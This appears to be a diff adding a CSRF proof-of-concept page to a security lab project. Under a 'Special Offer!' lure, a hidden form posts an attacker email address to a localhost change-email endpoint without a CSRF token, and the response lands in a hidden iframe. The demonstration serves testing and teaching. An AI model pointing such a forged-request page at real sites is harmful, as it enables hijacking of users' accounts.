@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Secure Endpoint</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #241633;
+            color: white;
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .card {
+            max-width: 500px;
+            margin: auto;
+            padding: 30px;
+            background: #ffffff15;
+            border-radius: 12px;
+        }
+
+        button {
+            padding: 12px 20px;
+            background: #e05252;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+    <h1>Special Offer!</h1>
+
+    <p>This page attempts to change the victim's email.</p>
+
+    <p>
+        Target:
+        <code>/api/change-email-secure</code>
+    </p>
+
+    <p>
+        Payload:
+        <code>email=attacker@example.com</code>
+    </p>
+
+    <p><strong>No CSRF token is included.</strong></p>
+
+    <button onclick="launchAttack()">Launch CSRF Attack</button>
+
+    <p id="status">Waiting to launch...</p>
+</div>
+
+<iframe name="attack-result" style="display:none"></iframe>
+
+<form
+    id="csrf-form"
+    action="https://localhost:3000/api/change-email-secure"
+    method="POST"
+    target="attack-result">
+
+    <input
+        type="hidden"
+        name="email"
+        value="attacker@example.com">
+
+</form>
+
+<script>
+    function launchAttack() {
+        document.getElementById("status").innerText =
+            "Attack submitted! Check the React application request log.";
+
+        document.getElementById("csrf-form").submit();
+    }
+</script>
+
+</body>
+</html>
